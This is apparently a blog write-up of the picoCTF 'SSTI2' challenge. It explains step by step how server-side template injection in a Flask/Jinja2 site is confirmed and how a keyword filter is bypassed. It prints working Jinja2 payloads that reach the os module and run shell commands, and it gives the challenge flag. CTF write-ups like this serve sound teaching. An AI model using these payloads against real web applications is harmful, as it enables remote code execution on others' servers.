---
layout: post
title: "SSTI2"
date: 2025-08-19
categories: [PicoCTF, webexploitation]
tags: [picoctf,webexploitation,Medium]
---

## Challenge Name: SSTI2

![SSTI2-Example](https://miro.medium.com/v2/resize:fit:640/format:webp/0*VhK65L_moW4sg87A.png)

### üîé Challenge Description
I made a cool website where you can announce whatever you want!  
I read about input sanitization, so now I remove any kind of characters that could be a problem :)

---

### üõ†Ô∏è Step-by-Step Approach

#### 1. Check the Technology
Run:
```
curl -i http://picoctf.net:64009/
```
This reveals it is likely **Flask with Jinja2 templates**.

---

#### 2. Test for Template Injection
Try:
{% raw %}
```
{{7*7}}
```
{% endraw %}
If you see `49`, then SSTI is confirmed ‚úÖ.

---

#### 3. First Payload with `config`
{% raw %}
```
{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```
{% endraw %}
But the server responds with:
```
Stop trying to break me >:(
```
So the challenge **blocks config and certain keywords**.

---

#### 4. Encoded Payload Attempt
{% raw %}
```
{{ getattr(
      getattr(
        getattr(config, "_"*2+"class"+"_"
*2), "init"), 
      "_"*2+"globals"+"_"
*2)["os"].popen("ls").read() }}
```
{% endraw %}
Still blocked ‚ùå.

---

#### 5. Switch to `request.application`
{% raw %}
```
{{request
 |attr('application')
 |attr('__globals__')
 |attr('__getitem__')('__builtins__')
 |attr('__getitem__')('__import__')('os')
 |attr('popen')('ls')
 |attr('read')()
}}
```
{% endraw %}
This lists files ‚úÖ.

---

#### 6. Read the Flag
{% raw %}
```
{{request
 |attr('application')
 |attr('__globals__')
 |attr('__getitem__')('__builtins__')
 |attr('__getitem__')('__import__')('os')
 |attr('popen')('cat flag')
 |attr('read')()
}}
```
{% endraw %}
Flag obtained:
```
picoCTF{sst1_f1lt3r_byp4ss_060a5eb0}
```

---

## üìò Beginner-Friendly Explanation

### 1. Your first payload used config
{% raw %}
```
{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}
```
{% endraw %}
- `config` is a Flask **Config object**.  
- From it, you moved into `__class__`, then `__init__`, then `__globals__`.  
- Inside `__globals__`, the **os module** was available.  

But if the CTF blocks `config` or `__class__` / `__globals__`, this path won‚Äôt work.

---

### 2. The other payload used request.application
{% raw %}
```
{{ request|attr('application')|attr('__globals__')|... }}
```
{% endraw %}
- `request.application` gives you the Flask **app object**.  
- The app object‚Äôs functions carry a `__globals__` dictionary.  
- From `__globals__`, you can reach `__builtins__`.  
- From `__builtins__`, you can get `__import__`, then load **os**.  

This path works even if `config` is blocked.

---

‚öñÔ∏è **Why ‚Äúrequest.application‚Äù works better**
- `config` path relies on Python **class internals** ‚Üí more likely blocked in CTFs.  
- `request.application` relies on **Flask internals** ‚Üí harder to block, always present.  

‚úÖ **Summary:**
- `config` = convenient if not filtered.  
- `request.application` = reliable fallback when filters exist.  

Both are just **different entry points** leading to the same goal: breaking into Python‚Äôs execution environment and achieving code execution.